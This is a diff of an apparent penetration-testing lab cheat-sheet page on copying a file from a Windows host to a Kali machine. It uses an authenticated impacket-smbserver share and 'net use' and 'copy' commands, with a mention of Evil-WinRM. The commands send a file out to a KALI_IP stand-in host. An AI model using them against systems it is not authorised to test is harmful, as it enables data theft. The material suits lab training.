@@ -21,19 +21,6 @@ Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=windows-to-linux) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-## Copy a Windows file into an authenticated lab share
-
-**Run in:** Windows cmd.exe. **Requires:** On Kali first run an authenticated impacket-smbserver named share over a dedicated writable transfer folder; TCP 445 must be reachable from Windows.
-
-```console
-net use \\KALI_IP\share /user:transfer TRANSFER_PASSWORD
-copy C:\path\file.zip \\KALI_IP\share\file.zip
-```
-
-**What the result establishes:** Identify which side listens and which side initiates; verify the received filename, size and digest.
-
-**Next check:** Inspect destination rights and filename, compare size and SHA-256 at both ends, then disconnect this share with net use when finished.
-
 ## 1. Kali — receive folder and SMB server
 
 **Kali**
@@ -44,6 +31,17 @@ sudo impacket-smbserver share ~/transfer -smb2support -user transfer -password '
 ```
 
 Keep this terminal running. Replace TRANSFER_PASSWORD in both commands.
+
+## 2. Windows — connect and copy
+
+**Windows cmd.exe**
+
+```bash
+net use \\KALI_IP\share /user:transfer TRANSFER_PASSWORD
+copy C:\path\file.zip \\KALI_IP\share\file.zip
+```
+
+The file appears in ~/transfer on Kali.
 
 ## Alternative — if already in Evil-WinRM
 
@@ -66,6 +64,8 @@ Saves the file on the Kali machine running Evil-WinRM.
 - [Official documentation 1](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
